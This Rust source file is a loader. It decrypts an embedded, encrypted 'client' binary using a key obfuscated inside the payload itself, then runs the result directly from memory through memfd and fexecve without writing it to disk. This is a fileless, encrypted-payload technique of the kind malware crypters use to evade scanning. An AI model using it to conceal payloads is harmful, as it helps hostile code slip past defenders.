use aes_gcm_siv::aead::Aead;
use aes_gcm_siv::{Aes256GcmSiv, Key, KeyInit};
use lib::obfuscated_key::ObfuscatedKey;
use lib::symetric::{Nonce, SymetricKey};
use memfd::MemfdOptions;
use nix::unistd::{fork, ForkResult};
use std::ffi::CString;
use std::io::Write;
use std::os::unix::io::AsRawFd;

unsafe extern "C" {
    fn fexecve(fd: i32, argv: *const *const i8, envp: *const *const i8) -> i32;
}

fn decrypt_code(key: &SymetricKey, data: &[u8]) -> anyhow::Result<Vec<u8>> {
    // Extract obfuscated key from end
    if data.len() < 32 {
        anyhow::bail!("File too small");
    }
    let (ciphertext, _obfuscated_key_bytes) = data.split_at(data.len() - 32);

    let key = Key::<Aes256GcmSiv>::try_from(key.as_ref())?;
    let cipher = Aes256GcmSiv::new(&key);
    let nonce = Nonce::default(); // Zero nonce
    let pt = cipher
        .decrypt(&nonce.into_aes_gcm(), ciphertext)
        .map_err(|e| anyhow::anyhow!("Decryption failed: {}", e))?;

    Ok(pt)
}

fn main() -> anyhow::Result<()> {
    let encrypted_data = include_bytes!("../../target/release/client.enc");

    println!("Extracting and deobfuscating key...");

    if encrypted_data.len() < 32 {
        anyhow::bail!("Encrypted file too small");
    }

    // Extract obfuscated key bytes
    let obfuscated_key_bytes = &encrypted_data[encrypted_data.len() - 32..];

    let obfuscated_key = ObfuscatedKey::from_bytes(obfuscated_key_bytes)?;

    let key_bytes = obfuscated_key.deobfuscate();
    let key = SymetricKey::from_bytes(key_bytes);

    println!("STARTED TO DECRYPT CODE!!!!!");
    let decrypted_code = decrypt_code(&key, encrypted_data)?;
    println!("FINISHED TO DECRYPT CODE!!!!!");

    let mfd = MemfdOptions::default()
        .allow_sealing(true)
        .create("client")
        .unwrap();
    let mut file = mfd.as_file();
    file.write_all(&decrypted_code).unwrap();

    use std::os::unix::fs::PermissionsExt;
    file.set_permissions(std::fs::Permissions::from_mode(0o755))
        .unwrap();

    let original_args: Vec<String> = std::env::args().collect();

    match unsafe { fork() }.unwrap() {
        ForkResult::Child => {
            let mut argv_strings = vec![CString::new("client").unwrap()];
            // skip program name
            for arg in original_args.iter().skip(1) {
                argv_strings.push(CString::new(arg.as_str()).unwrap());
            }

            let argv_ptrs: Vec<*const i8> = argv_strings
                .iter()
                .map(|a| a.as_ptr())
                .chain([std::ptr::null()])
                .collect();
            let envp = [std::ptr::null()];

            unsafe {
                fexecve(file.as_raw_fd(), argv_ptrs.as_ptr(), envp.as_ptr());
            }
            panic!("fexecve failed");
        }
        ForkResult::Parent { child } => {
            use nix::sys::wait::waitpid;
            let _status = waitpid(child, None)?;
        }
    }

    Ok(())
}
